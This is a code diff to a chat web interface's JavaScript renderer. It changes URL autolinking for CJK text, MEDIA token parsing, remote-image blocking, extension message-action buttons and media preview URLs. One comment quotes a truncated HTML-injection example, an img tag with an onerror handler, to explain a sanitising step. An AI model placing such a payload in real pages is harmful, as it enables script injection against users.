-  // #7680 re-gate (9/22): two-pass scan.
-  //   1. `` `MEDIA:path` `` (backtick-wrapped, inline-code form) → strip
-  //      the wrapping backticks so the bare-token pass below sees a
-  //      plain ``MEDIA:path`` and the closing backtick is not consumed
-  //      as part of the path.
-  //   2. ``MEDIA:[^\s\)\]]+`` (bare, no backtick in the exclusion
-  //      class) so a filename that legally contains a backtick
-  //      (``report`final.png``) is captured in full instead of being
-  //      truncated at the first backtick.
-  s=s.replace(/`MEDIA:([^`\s]+)`/g,'MEDIA:$1');
-  s=s.replace(/MEDIA:([^\s\)\]]+)/g,(_,raw_ref)=>{
-    media_stash.push(raw_ref);
-    return '\x00D'+(media_stash.length-1)+'\x00';
+  s=s.replace(/MEDIA:([^\s\)\]]+)/g,(token,raw_ref,offset)=>{
+    const parts=_mediaTokenParts(s,offset,raw_ref);
+    if(!parts) return token;
+    media_stash.push(parts[0]);
+    return '\x00D'+(media_stash.length-1)+'\x00'+parts[1];
   });
   // ── End MEDIA stash ─────────────────────────────────────────────────────────
   // Pre-pass: decode HTML entities first so markdown processing works correctly.
@@ -7919,6 +8272,105 @@ function renderMd(raw){
   // Inline backtick spans: restore <code> tags produced in the stash callback above.
   // Must happen BEFORE bold/italic so **`code`** → <strong><code>code</code></strong>.
   s=s.replace(/\x00F(\d+)\x00/g,(_,i)=>fence_stash[+i]);
+  function _isCjkAutolinkChar(ch){
+    return /[\u3040-\u30ff\u3400-\u9fff\uac00-\ud7af]/.test(ch||'');
+  }
+  // Return one URL's exclusive end inside a maximal whitespace-free URL run.
+  // nextCjk and nextQuery are suffix tables shared by every URL in that run.
+  function _bareAutolinkEnd(run,start,nextCjk,nextQuery){
+    const schemeEnd=run.indexOf('://',start)+3;
+    let authorityEnd=schemeEnd;
+    while(authorityEnd<run.length&&!/[/?#]/.test(run[authorityEnd])) authorityEnd++;
+    const pathStart=run[authorityEnd]==='/'?authorityEnd:-1;
+    const queryFragmentStart=nextQuery[schemeEnd];
+    const firstCjkPath=pathStart<0?-1:nextCjk[pathStart];
+    const firstCjkQuery=queryFragmentStart<0?-1:nextCjk[queryFragmentStart+1];
+    // Closing marks and sentence punctuation end a URL. Full-width OPENING
+    // marks（【「『 also end it: prose such as `…/pull/8040（OPEN、…` starts
+    // there. The raw-CJK-path guard further down still keeps interior marks
+    // of genuine IRIs (for example `…/wiki/スター（映画）`).
+    const boundaryMarks='，。．｡；：！？、）】」》〕（【「『';
+    let currentLabelStart=schemeEnd;
+    for(let i=schemeEnd;i<run.length;i++){
+      const mark=run[i];
+      if(mark==='.'){currentLabelStart=i+1;continue;}
+      if(!boundaryMarks.includes(mark)) continue;
+      if(run.startsWith('http://',i+1)||run.startsWith('https://',i+1)) return i;
+      // U+FF0E and U+FF61 are ordinary IRI characters outside the authority.
+      // Keep them in paths, queries, and fragments just as master does.
+      if((mark==='．'||mark==='｡')&&i>=authorityEnd) continue;
+      // UTS #46 maps these three authority characters to an ASCII dot. They
+      // are label separators before an ASCII label. Also retain a CJK label
+      // when the host prefix already contains raw CJK; this covers real IDNs
+      // such as 例子。中国 without mistaking example.com。参见docs/ for one.
+      if((mark==='。'||mark==='．'||mark==='｡')&&i<authorityEnd
+         &&i+1<authorityEnd){
+        if(/[A-Za-z0-9_\-]/.test(run[i+1])){currentLabelStart=i+1;continue;}
+        // Keep a Unicode label when this is the first host separator, when the
+        // immediately preceding label is itself Unicode (www.例子。中国), or when the
+        // next label starts with a non-CJK script letter (www.example。рф). CJK,
+        // Common-script and fullwidth characters after an ASCII label are prose, so
+        // `example.com。参见` / `example.com．次に進む` / `example.com。２０２４年` still end
+        // at the TLD.
+        const firstLabelChar=String.fromCodePoint(run.codePointAt(i+1));
+        let unicodeLabel=currentLabelStart===schemeEnd
+          ||(/\p{L}/u.test(firstLabelChar)
+             &&!/[A-Za-z\p{Script=Common}\p{Script=Inherited}\uFF00-\uFFEF]/u.test(firstLabelChar)
+             &&!_isCjkAutolinkChar(firstLabelChar)
+             &&!/[\p{Script_Extensions=Han}\p{Script_Extensions=Hiragana}\p{Script_Extensions=Katakana}\p{Script_Extensions=Hangul}\p{Script_Extensions=Bopomofo}]/u.test(firstLabelChar));
+        for(let j=currentLabelStart;!unicodeLabel&&j<i;){
+          const c=String.fromCodePoint(run.codePointAt(j));
+          unicodeLabel=/[\p{L}\p{M}\p{N}]/u.test(c)
+            &&!/[A-Za-z0-9]/.test(c);
+          j+=c.length;
+        }
+        for(let j=i+1;unicodeLabel&&j<authorityEnd;){
+          const c=String.fromCodePoint(run.codePointAt(j));
+          if(c==='.'||c===':'||boundaryMarks.includes(c)) break;
+          unicodeLabel=/[\p{L}\p{M}\p{N}_\-]/u.test(c);
+          j+=c.length;
+        }
+        if(unicodeLabel){currentLabelStart=i+1;continue;}
+      }
+      // Preserve marks in a query/fragment after raw CJK content. ASCII
+      // fragment continuations are also common section identifiers. A mark
+      // before the first CJK character remains a prose boundary, so
+      // `?q=1，参见` does not swallow the following sentence.
+      if(queryFragmentStart>=0&&i>queryFragmentStart&&i<run.length-1){
+        if((firstCjkQuery>=0&&firstCjkQuery<i)
+           ||(run[queryFragmentStart]==='#'&&/[A-Za-z0-9_\-]/.test(run[i+1]))) continue;
+        return i;
+      }
+      // Once a path contains raw CJK, interior CJK punctuation is a plausible
+      // IRI character, but it must not override a later query boundary.
+      if(firstCjkPath>=0&&firstCjkPath<i
+         &&(queryFragmentStart<0||i<queryFragmentStart)&&i<run.length-1) continue;
+      return i;
+    }
+    return /[.,;:!?)]$/.test(run)?run.length-1:run.length;
+  }
+  function _autolinkBareRun(run){
+    const nextCjk=new Int32Array(run.length+1);
+    const nextQuery=new Int32Array(run.length+1);
+    nextCjk[run.length]=-1;
+    nextQuery[run.length]=-1;
+    for(let i=run.length-1;i>=0;i--){
+      nextCjk[i]=_isCjkAutolinkChar(run[i])?i:nextCjk[i+1];
+      nextQuery[i]=(run[i]==='?'||run[i]==='#')?i:nextQuery[i+1];
+    }
+    const schemeRe=/https?:\/\//g;
+    let out='';
+    let cursor=0;
+    let match;
+    while((match=schemeRe.exec(run))){
+      out+=run.slice(cursor,match.index);
+      const end=_bareAutolinkEnd(run,match.index,nextCjk,nextQuery);
+      out+=_autolinkAnchor(run.slice(match.index,end));
+      cursor=end;
+      schemeRe.lastIndex=end;
+    }
+    return out+run.slice(cursor);
+  }
   // inlineMd: process bold/italic/code/links within a single line of text.
   // Used inside list items and blockquotes where the text may already contain
   // HTML from the pre-pass → bold pipeline, so we cannot call esc() directly.
@@ -7943,7 +8395,7 @@ function renderMd(raw){
     // Stash [label](url) links before autolink so the URL in href= is not re-linked
     const _link_stash=[];
     t=t.replace(/\[([^\]]+)\]\(((?:https?:\/\/|file:\/\/|workspace:\/\/|session:\/\/|mailto:|tel:|message:)[^\s\)]+)\)/g,(_,lb,u)=>{_link_stash.push(_markdownAnchor(lb,u));return `\x00L${_link_stash.length-1}\x00`;});
-    t=t.replace(/(https?:\/\/[^\s<>"')\]\uFF09]+)/g,(url)=>{const trail=url.match(/[.,;:!?)\uFF09\uFF0C\uFF1B\uFF1A\uFF01\uFF1F\u3001\u3002]$/)?url.slice(-1):'';const clean=trail?url.slice(0,-1):url;return `<a href="${clean}" target="_blank" rel="noopener">${esc(clean)}</a>${trail}`;});
+    t=_autolinkBareText(t);
     t=t.replace(/\x00L(\d+)\x00/g,(_,i)=>_link_stash[+i]);
     t=t.replace(/\x00G(\d+)\x00/g,(_,i)=>_img_stash[+i]);
     // Escape any plain text that isn't already wrapped in a tag we produced
@@ -8271,10 +8723,28 @@ function renderMd(raw){
       const rel=a.rel==='noopener'?' rel="noopener"':'';
       const cls=_cls(a.class,['msg-media-link','skill-linked-file','skill-file-back','session-link']);
       const download=a.download?` download="${esc(a.download)}"`:'';
-      return `<a${cls} href="${esc(_safeAttrValue(a.href))}"${target}${rel}${download}>`;
+      // #7941: keep the blocked-remote-image tooltip only on a media chip whose
+      // href really is a non-allowlisted remote image AND whose title begins with
+      // the reason computed from that same href, so model-authored anchors cannot
+      // carry arbitrary tooltips.
+      let tipAttr='';
+      if(a.title&&cls.includes('msg-media-link')&&typeof _remoteImageAllowed==='function'
+         &&typeof _remoteImageReason==='function'){
+        const href=_safeAttrValue(a.href);
+        const tip=_safeAttrValue(a.title);
+        const reason=/^https?:\/\//i.test(href)&&!_remoteImageAllowed(href)?_remoteImageReason(href):'';
+        // Exactly the shapes _remoteImagePlaceholderHtml emits: the reason, or the
+        // reason followed by " (<alt>)".
+        // The producer caps alt at 120 chars; re-admit no longer suffix than that.
+        if(reason&&(tip===reason||(tip.startsWith(reason+' (')&&tip.endsWith(')')&&tip.length<=reason.length+123))){
+          tipAttr=` title="${esc(tip)}"`;
+        }
+      }
+      return `<a${cls} href="${esc(_safeAttrValue(a.href))}"${target}${rel}${download}${tipAttr}>`;
     }
     if(name==='img'){
       if(!_isSafeUrl(a.src,true)) return '';
+      if(typeof _remoteImageAllowed==='function'&&!_remoteImageAllowed(_safeAttrValue(a.src))) return _remoteImagePlaceholderHtml(_safeAttrValue(a.src), _safeAttrValue(a.alt||''));
       const cls=_cls(a.class,['msg-media-img']);
       const alt=` alt="${esc(_safeAttrValue(a.alt||''))}"`;
       const loading=a.loading==='lazy'?' loading="lazy"':'';
@@ -8287,18 +8757,23 @@ function renderMd(raw){
   // renderer's generated </p> could provide a closing ">" and turn them into
   // executable HTML in innerHTML (for example: <img src=x onerror=...//).
   s=s.replace(/<[a-zA-Z][\w:-]*[^>\n]*$/gm,tag=>esc(tag));
-  // Autolink: convert plain URLs to clickable links.
+  // Autolink: convert plain URLs to clickable links. Both inline and block
+  // rendering use this helper so their boundary and safety rules stay equal.
+  function _autolinkAnchor(clean){
+    return `<a href="${clean}" target="_blank" rel="noopener">${esc(clean)}</a>`;
+  }
+  function _autolinkBareText(text){
+    return String(text||'').replace(
+      /(https?:\/\/[^\s<>"')\]\uFF09]+)/g,
+      run=>_autolinkBareRun(run),
+    );
+  }
   // Stash <a>, <img> and <pre> blocks so autolink never runs inside them.
   const _al_stash=[];
   s=s.replace(/(<a\b[^>]*>[\s\S]*?<\/a>|<img\b[^>]*>|<pre\b[^>]*>[\s\S]*?<\/pre>)/g,m=>{_al_stash.push(m);return `\x00B${_al_stash.length-1}\x00`;});
-  s=s.replace(/(https?:\/\/[^\s<>"')\]\uFF09]+)/g,(url)=>{
-    // Strip trailing punctuation that was likely not part of the URL.
-    // CJK full-width punctuation (）。，；：！？、) is included because LLMs
-    // frequently use full-width delimiters in Chinese/Japanese text.
-    const trail=url.match(/[.,;:!?)]$/)||url.match(/[\uFF09\uFF0C\uFF1B\uFF1A\uFF01\uFF1F\u3001\u3002]$/)?url.slice(-1):'';
-    const clean=trail?url.slice(0,-1):url;
-    return `<a href="${clean}" target="_blank" rel="noopener">${esc(clean)}</a>${trail}`;
-  });
+  // Split high-confidence sentence boundaries while preserving valid CJK IRI
+  // content, then rescan each plain-text trail so adjacent URLs all link.
+  s=_autolinkBareText(s);
   s=s.replace(/\x00B(\d+)\x00/g,(_,i)=>_al_stash[+i]);
   // Restore math stash → katex placeholder spans/divs
   // These will be rendered by renderKatexBlocks() after DOM insertion
@@ -10359,7 +10834,11 @@ async function refreshSession() {
   dismissReconnect();
   if (!S.session) return;
   try {
-    const data = await api(`/api/session?session_id=${encodeURIComponent(S.session.session_id)}`);
+    // Bounded tail (msg_limit=30) — a bare reload used to pull and re-redact
+    // the ENTIRE transcript on every offline/bfcache recovery (#7310/#7625).
+    // truncation signal + _oldestIdx are read below, so the Load-earlier
+    // paging gate still works after the windowed refresh.
+    const data = await api(`/api/session?session_id=${encodeURIComponent(S.session.session_id)}&messages=1&resolve_model=0&msg_limit=30&expand_renderable=1`);
     S.session = data.session;
     if(typeof _adoptRegenerationRevision==='function') _adoptRegenerationRevision(data.session);
     S.messages = data.session.messages || [];
@@ -10387,7 +10866,8 @@ function _formatUpdateTargetStatus(label,info){
 }
 function _formatManualUpdateInstruction(info){
   if(!(info&&info.no_git&&info.manual_update&&info.behind>0)) return null;
-  return t('settings_update_manual_docker','docker pull ghcr.io/nesquena/hermes-webui:latest');
+  const tag=info.channel==='experimental'?'experimental':'latest';
+  return t('settings_update_manual_docker',`docker pull ghcr.io/nesquena/hermes-webui:${tag}`);
 }
 function _formatUpdateCheckError(label,info){
   if(!info||!info.error) return null;
@@ -10705,9 +11185,9 @@ function _showUpdateBanner(data){
     btnApply.style.display=hasApplyTargets?'':'none';
     if(webuiManual){
       const forceBtn=$('btnForceUpdate');
-      if(forceBtn){forceBtn.disabled=true;forceBtn.style.display='none';forceBtn.dataset.target='';}
+      if(forceBtn&&!(agentUpdatable&&forceBtn.dataset.target==='agent')){forceBtn.disabled=true;forceBtn.style.display='none';forceBtn.dataset.target='';}
       const clearLockBtn=$('btnClearUpdateLock');
-      if(clearLockBtn){clearLockBtn.disabled=true;clearLockBtn.style.display='none';clearLockBtn.dataset.target='';}
+      if(clearLockBtn&&!(agentUpdatable&&clearLockBtn.dataset.target==='agent')){clearLockBtn.disabled=true;clearLockBtn.style.display='none';clearLockBtn.dataset.target='';}
     }
   }
   if(!parts.length){
@@ -10831,6 +11311,7 @@ function _showUpdateError(target,res){
   // modifications).
   if(forceBtn&&(res.conflict||res.diverged)){
     forceBtn.dataset.target=target;
+    forceBtn.disabled=false;
     forceBtn.style.display='inline-block';
   }
   // Show "Clear lock and retry update" when the only failure was a stale
@@ -10839,6 +11320,7 @@ function _showUpdateError(target,res){
   const clearLockBtn=$('btnClearUpdateLock');
   if(clearLockBtn&&res.lock_conflict){
     clearLockBtn.dataset.target=target;
+    clearLockBtn.disabled=false;
     clearLockBtn.style.display='inline-block';
   }
 }
@@ -14061,6 +14543,8 @@ function _renderAnchorSceneRowsIntoWorklog(group, rows, opts){
     }
     for(const {row,key,entry,node} of plans){
       if(entry){
+        const disclosure=typeof _captureWorklogDetailDisclosureState==='function'
+          ? _captureWorklogDetailDisclosureState(entry.node) : null;
         if(typeof _anchorSceneWorklogReplaceOwnedTool==='function') _anchorSceneWorklogReplaceOwnedTool(state,entry.node,node);
         const parent=entry.node.parentElement;
         if(typeof parent.replaceChild==='function') parent.replaceChild(node,entry.node);
@@ -14069,6 +14553,7 @@ function _renderAnchorSceneRowsIntoWorklog(group, rows, opts){
           if(childIndex>=0){parent.children[childIndex]=node;node.parentElement=parent;entry.node.parentElement=null;}
         }
         entry.row=row;entry.node=node;
+        if(typeof _restoreWorklogDetailDisclosureState==='function') _restoreWorklogDetailDisclosureState(node,disclosure);
       }else{
         _anchorSceneWorklogAppendRow(list,row,node,state);
         state.orderKeys.push(key);state.entryByKey.set(key,{row,node});state.rowsLength+=1;
@@ -14469,6 +14954,8 @@ function _tryIncrementalTransparentAnchorPaint(turn, blocks, rows, opts){
   let reused=0;
   for(const plan of plans){
     const {index,row,key,existing,node}=plan;
+    const disclosure=existing&&typeof _captureWorklogDetailDisclosureState==='function'
+      ? _captureWorklogDetailDisclosureState(existing) : null;
     let mounted=node;
     if(existing&&_transparentLiveRowsCompatible(existing,node)){
       mounted=_refreshTransparentLiveRow(existing,node,{});
@@ -14482,6 +14969,7 @@ function _tryIncrementalTransparentAnchorPaint(turn, blocks, rows, opts){
     }
     state.nodes[index]=mounted;
     state.keys[index]=key;
+    if(typeof _restoreWorklogDetailDisclosureState==='function') _restoreWorklogDetailDisclosureState(mounted,disclosure);
   }
   const label=bar.querySelector('.transparent-event-controls-label');
   const stashed=Number(turn.getAttribute&&turn.getAttribute('data-transparent-total-tool-count'))||0;
@@ -16502,6 +16990,114 @@ function clearMessageRenderCache(){
   _clearMessageVirtualHeightCache();
 }
 
+function _extensionMessageActionContext(slot,includeText){
+  if(!slot||!S.session||!slot.closest) return null;
+  if(slot.closest('[hidden],[aria-hidden="true"],[data-live-assistant="1"]')) return null;
+  const owner=slot.closest('[data-msg-idx][data-session-msg-idx][data-raw-text]');
+  const roleOwner=slot.closest('[data-role]');
+  const role=roleOwner&&roleOwner.dataset?roleOwner.dataset.role:'';
+  if(!owner||(role!=='user'&&role!=='assistant')) return null;
+  const rawIdx=Number(owner.dataset.msgIdx);
+  const messageIndex=Number(owner.dataset.sessionMsgIdx);
+  if(!Number.isSafeInteger(rawIdx)||rawIdx<0||!Number.isSafeInteger(messageIndex)||messageIndex<0) return null;
+  if(_messageSessionIndexForRawIdx(rawIdx)!==messageIndex) return null;
+  const message=S.messages&&S.messages[rawIdx];
+  if(!message||message.role!==role) return null;
+  const context={sessionId:String(S.session.session_id||''),messageIndex,role};
+  if(!context.sessionId) return null;
+  if(includeText) context.text=String(owner.dataset.rawText||'');
+  return context;
+}
+
+function _extensionMessageActionButtonHtml(action,context){
+  const label=esc(String(action.label||''));
+  const pending=action.pending===true;
+  return `<button type="button" class="msg-action-btn extension-msg-action" data-extension-message-action="1" data-extension-id="${esc(String(action.extensionId||''))}" data-extension-action-id="${esc(String(action.id||''))}" data-session-id="${esc(context.sessionId)}" data-message-index="${context.messageIndex}" data-message-role="${context.role}" title="${label}" aria-label="${label}" aria-pressed="${action.pressed===true?'true':'false'}" aria-busy="${pending?'true':'false'}"${pending?' disabled':''} onclick="invokeExtensionMessageAction(this)">${li(action.icon,13)}</button>`;
+}
+
+function _syncExtensionMessageActionSlots(root){
+  const runtime=window.HermesExtensionSettings;
+  if(!runtime||typeof runtime._messageActionsForContext!=='function') return;
+  const scope=root&&typeof root.querySelectorAll==='function'?root:document;
+  // No extension has registered an action (the common case): skip per-row context
+  // resolution and only empty slots still holding buttons from a retired registration.
+  if(typeof runtime._hasMessageActions==='function'&&!runtime._hasMessageActions()){
+    for(const slot of scope.querySelectorAll('[data-extension-message-actions]:not(:empty)')) slot.innerHTML='';
+    return;
+  }
+  for(const slot of scope.querySelectorAll('[data-extension-message-actions]')){
+    const context=_extensionMessageActionContext(slot,false);
+    const actions=context?runtime._messageActionsForContext(context):[];
+    const existing=Array.from(slot.children||[]);
+    const sameActions=existing.length===actions.length&&existing.every((button,index)=>{
+      const action=actions[index];
+      return !!(
+        button&&button.dataset&&action&&
+        button.dataset.extensionId===action.extensionId&&
+        button.dataset.extensionActionId===action.id
+      );
+    });
+    if(sameActions){
+      existing.forEach((button,index)=>{
+        const action=actions[index];
+        const pending=action.pending===true;
+        button.dataset.sessionId=context.sessionId;
+        button.dataset.messageIndex=String(context.messageIndex);
+        button.dataset.messageRole=context.role;
+        button.setAttribute('aria-pressed',action.pressed===true?'true':'false');
+        button.setAttribute('aria-busy',pending?'true':'false');
+        button.disabled=pending;
+      });
+      continue;
+    }
+    const html=actions.map(action=>_extensionMessageActionButtonHtml(action,context)).join('');
+    if(slot.innerHTML!==html) slot.innerHTML=html;
+  }
+}
+
+function invokeExtensionMessageAction(button){
+  if(!button||button.disabled) return false;
+  const slot=button.closest&&button.closest('[data-extension-message-actions]');
+  const context=_extensionMessageActionContext(slot,true);
+  if(!context) return false;
+  if(
+    button.dataset.sessionId!==context.sessionId||
+    Number(button.dataset.messageIndex)!==context.messageIndex||
+    button.dataset.messageRole!==context.role
+  ) return false;
+  const runtime=window.HermesExtensionSettings;
+  if(!runtime||typeof runtime._invokeMessageAction!=='function') return false;
+  return runtime._invokeMessageAction(
+    button.dataset.extensionId,
+    button.dataset.extensionActionId,
+    context,
+    {
+      opener:button,
+      onError(){
+        if(typeof showToast==='function') showToast('Extension message action failed',4000,'error');
+      },
+    }
+  );
+}
+
+let _extensionMessageActionChangeUnsubscribe=null;
+window._bindHermesExtensionMessageActions=function(){
+  if(_extensionMessageActionChangeUnsubscribe) return;
+  const runtime=window.HermesExtensionSettings;
+  if(!runtime||typeof runtime._onMessageActionChange!=='function') return;
+  _extensionMessageActionChangeUnsubscribe=runtime._onMessageActionChange((change)=>{
+    // Only cached transcript HTML can hold stale action buttons. A pending flip is
+    // reconciled in place below (the opener stays connected), so it drops nothing;
+    // other changes drop just the per-session HTML, not the markdown/height caches.
+    if(!change||change.reason!=='pending'){
+      _sessionHtmlCache.clear();
+      _sessionHtmlCacheSid=null;
+    }
+    _syncExtensionMessageActionSlots(document.getElementById('msgInner'));
+  });
+  _syncExtensionMessageActionSlots(document.getElementById('msgInner'));
+};
+
 // #6999: feed a structured payload field's string form through the FNV-1a
 // loop IN FULL, without materializing clipped copies or skipping the middle.
 // The previous length+head+tail clip made same-length middle-only edits
@@ -17744,6 +18340,8 @@ function _insertSegmentBlock(seg, html){
 }
 function renderMessages(options){
   _lastMessageRenderAt=performance.now();
+  // typeof guard: node harnesses extract renderMessages() without its helpers (#6717).
+  if(!(options&&options._internalMeasurement) && typeof _resetMessageVirtualMeasurementBurst==='function'){ _resetMessageVirtualMeasurementBurst(); }
   const preserveScroll=!!(options&&options.preserveScroll);
   const virtualFallback=!!(options&&options._virtualFallback);
   // Capture the pre-wipe scroll position when preserving OR when the reader has
@@ -17807,6 +18405,7 @@ function renderMessages(options){
       _sessionHtmlCacheSid=sid;
       _rehydrateTransparentStreamDom(inner);
       _rehydrateDeferredWorklogsFromCache(inner);
+      if(typeof _syncExtensionMessageActionSlots==='function') _syncExtensionMessageActionSlots(inner);
       _wireMessageWindowLoadEarlierButton();
       if(typeof _applySessionNavigationPrefs==='function') _applySessionNavigationPrefs();
       _scrollAfterMessageRender(preserveScroll, scrollSnapshot);
@@ -18317,7 +18916,8 @@ function renderMessages(options){
     const questionJumpBtn = (_qJumpTarget!==undefined&&_qJumpTarget!==null)
       ? _questionJumpButtonHtml(_qJumpTarget, assistantRawIdxByQuestionRawIdx.get(_qJumpTarget)??rawIdx)
       : '';
-    const footHtml = `<div class="msg-foot">${timeHtml}<span class="msg-actions">${editBtn}${ttsBtn}${forkBtn}${copyBtn}${retryBtn}</span>${questionJumpBtn}</div>`;
+    const extensionActionsSlot='<span class="extension-message-actions" data-extension-message-actions></span>';
+    const footHtml = `<div class="msg-foot">${timeHtml}<span class="msg-actions">${editBtn}${ttsBtn}${forkBtn}${copyBtn}${retryBtn}${extensionActionsSlot}</span>${questionJumpBtn}</div>`;
 
     if(_isContextCompactionMessage(m)){
       continue;
@@ -19473,6 +20073,7 @@ function renderMessages(options){
   }
   // Apply persisted playback speed after media nodes are rendered.
   if(typeof _applyMediaPlaybackPreferences==='function') _applyMediaPlaybackPreferences(inner);
+  if(typeof _syncExtensionMessageActionSlots==='function') _syncExtensionMessageActionSlots(inner);
   // Populate session cache so switching back here skips a full rebuild.
   _sessionHtmlCacheSid=sid;
   // Skip caching while the just-settled keep-open token is armed: that render
@@ -20954,8 +21555,8 @@ function loadDiffInline(container){
   root.querySelectorAll('.diff-inline-load:not([data-loaded])').forEach(el=>{
     el.setAttribute('data-loaded','1');
     const path=el.dataset.path;
-    const snapQuery=_mediaSnapQuery(el);
-    fetch('api/media?path='+encodeURIComponent(path)+snapQuery)
+    const snap=_mediaSnapQuery(el).replace(/^&snap=/,'');
+    fetch(_mediaPreviewUrl(path,{snap:snap||undefined}))
       .then(r=>{if(!r.ok) throw new Error(r.status);return r.text();})
       .then(text=>{
         if(text.length>DIFF_MAX_SIZE){
@@ -20993,11 +21594,16 @@ function _mediaSnapQuery(el){
   return (snap&&/^[0-9a-f]{64}$/.test(snap))?('&snap='+snap):'';
 }
 
-function _csvMediaUrl(path, opts={}){
+function _mediaPreviewUrl(path, opts={}){
   let url='api/media?path='+encodeURIComponent(path)+_mediaSessionQuery();
   if(opts.snap) url+='&snap='+encodeURIComponent(opts.snap);
+  if(opts.inline) url+='&inline=1';
   if(opts.download) url+='&download=1';
   return url;
+}
+
+function _csvMediaUrl(path, opts={}){
+  return _mediaPreviewUrl(path, opts);
 }
 
 function buildCsvTablePreview(path, text, downloadUrl=''){
@@ -21024,9 +21630,8 @@ function buildCsvTablePreview(path, text, downloadUrl=''){
   };
 }
 
-function _csvPreviewErrorHtml(path, errorKey){
+function _csvPreviewErrorHtml(path, errorKey, downloadUrl=_csvMediaUrl(path,{download:true})){
   const fname=path.split('/').pop()||path;
-  const downloadUrl=_csvMediaUrl(path,{download:true});
   return `<div class="diff-inline-error">${esc(fname)}<br><a class="msg-media-link" href="${esc(downloadUrl)}" download="${esc(fname)}">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t(errorKey)}</span></div>`;
 }
 
@@ -21042,10 +21647,10 @@ function loadCsvInline(container){
       .then(r=>{if(!r.ok) throw new Error(r.status);return r.text();})
       .then(text=>{
         const preview=buildCsvTablePreview(path, text, downloadUrl);
-        el.outerHTML=preview.html||_csvPreviewErrorHtml(path, preview.errorKey||'csv_error');
+        el.outerHTML=preview.html||_csvPreviewErrorHtml(path, preview.errorKey||'csv_error', downloadUrl);
       })
       .catch(()=>{
-        el.outerHTML=_csvPreviewErrorHtml(path, 'csv_error');
+        el.outerHTML=_csvPreviewErrorHtml(path, 'csv_error', downloadUrl);
       });
   });
 }
@@ -21056,8 +21661,9 @@ function loadExcalidrawInline(container){
   root.querySelectorAll('.excalidraw-inline-load:not([data-loaded])').forEach(el=>{
     el.setAttribute('data-loaded','1');
     const path=el.dataset.path;
-    const snapQuery=_mediaSnapQuery(el);
-    fetch('api/media?path='+encodeURIComponent(path)+snapQuery)
+    const snap=_mediaSnapQuery(el).replace(/^&snap=/,'');
+    const downloadUrl=_mediaPreviewUrl(path,{download:true,snap:snap||undefined});
+    fetch(_mediaPreviewUrl(path,{snap:snap||undefined}))
       .then(r=>{if(!r.ok) throw new Error(r.status);return r.text();})
       .then(text=>{
         if(text.length>EXCALIDRAW_MAX_SIZE){
@@ -21075,7 +21681,6 @@ function loadExcalidrawInline(container){
           return;
         }
         const fname=esc(path.split('/').pop());
-        const downloadUrl='api/media?path='+encodeURIComponent(path)+'&download=1';
         el.outerHTML=`<div class="excalidraw-embed-wrap" title="${t('excalidraw_simplified')}">
   <div class="msg-artifact-header">
     <span class="msg-media-label">${t('excalidraw_label')}</span>
@@ -21185,16 +21790,15 @@ function loadPdfInline(container){
     el.setAttribute('data-loaded','1');
     const path=el.dataset.path;
     const fname=path.split('/').pop()||path;
-    const mediaSessionId=(typeof S!=='undefined'&&S&&S.session&&S.session.session_id)?String(S.session.session_id):'';
-    const snapQuery=_mediaSnapQuery(el);
-    const publicMediaUrl='api/media?path='+encodeURIComponent(path);
-    const mediaUrl=publicMediaUrl+(mediaSessionId?'&session_id='+encodeURIComponent(mediaSessionId):'')+snapQuery;
+    const snap=_mediaSnapQuery(el).replace(/^&snap=/,'');
+    const mediaUrl=_mediaPreviewUrl(path,{snap:snap||undefined});
+    // Freeze action URLs alongside the fetch: callbacks may run in another session.
+    const dlUrl=_mediaPreviewUrl(path,{download:true,snap:snap||undefined});
     const loadPdf=(pdfjsLib)=>{
       fetch(mediaUrl)
         .then(r=>{if(!r.ok) throw new Error(r.status); return r.arrayBuffer();})
         .then(buf=>{
           if(buf.byteLength>PDF_MAX_SIZE){
-            const dlUrl=publicMediaUrl+'&download=1'+snapQuery;
             el.outerHTML=`<div class="pdf-preview-fallback"><a class="msg-media-link" href="${dlUrl}" download="${esc(fname)}">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t('pdf_too_large')}</span></div>`;
             return;
           }
@@ -21202,7 +21806,6 @@ function loadPdfInline(container){
         })
         .then(pdf=>{
           if(!pdf) return;
-          const dlUrl=publicMediaUrl+'&download=1'+snapQuery;
           const total=pdf.numPages;
           const pagesLabel=total>1?` · ${total} pages`:'';
           const wrap=document.createElement('div');
@@ -21241,7 +21844,6 @@ function loadPdfInline(container){
           renderPage(1);
         })
         .catch(()=>{
-          const dlUrl=publicMediaUrl+'&download=1'+snapQuery;
           el.outerHTML=`<div class="pdf-preview-fallback"><a class="msg-media-link" href="${dlUrl}" download="${esc(fname)}">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t('pdf_error')}</span></div>`;
         });
     };
@@ -21261,7 +21863,6 @@ function loadPdfInline(container){
       window.addEventListener('pdfjs-ready',()=>{ _pdfjsReady=true; loadPdf(window._pdfjsLib); },{once:true});
       setTimeout(()=>{
         if(!_pdfjsReady){
-          const dlUrl=publicMediaUrl+'&download=1'+snapQuery;
           if(el.parentNode){
             el.outerHTML=`<div class="pdf-preview-fallback"><a class="msg-media-link" href="${dlUrl}" download="${esc(fname)}">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t('pdf_error')}</span></div>`;
           }
@@ -21281,24 +21882,21 @@ function loadHtmlInline(container){
     el.setAttribute('data-loaded','1');
     const path=el.dataset.path;
     const fname=path.split('/').pop()||path;
-    const mediaSessionId=(typeof S!=='undefined'&&S&&S.session&&S.session.session_id)?String(S.session.session_id):'';
-    const snapQuery=_mediaSnapQuery(el);
-    const publicMediaUrl='api/media?path='+encodeURIComponent(path);
-    const mediaUrl=publicMediaUrl+(mediaSessionId?'&session_id='+encodeURIComponent(mediaSessionId):'')+snapQuery;
+    const snap=_mediaSnapQuery(el).replace(/^&snap=/,'');
+    const mediaUrl=_mediaPreviewUrl(path,{snap:snap||undefined});
+    const openUrl=_mediaPreviewUrl(path,{inline:true,snap:snap||undefined});
+    const dlUrl=_mediaPreviewUrl(path,{download:true,snap:snap||undefined});
     fetch(mediaUrl, {cache:'no-store'})
       .then(r=>{if(!r.ok) throw new Error(r.status); return r.text();})
       .then(html=>{
         if(html.length>HTML_MAX_SIZE){
-          const openUrl=publicMediaUrl+'&inline=1'+snapQuery;
           el.outerHTML=`<div class="html-preview-fallback"><a class="msg-media-link" href="${openUrl}" target="_blank" rel="noopener">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t('html_too_large')}</span></div>`;
           return;
         }
-        const openUrl=publicMediaUrl+'&inline=1'+snapQuery;
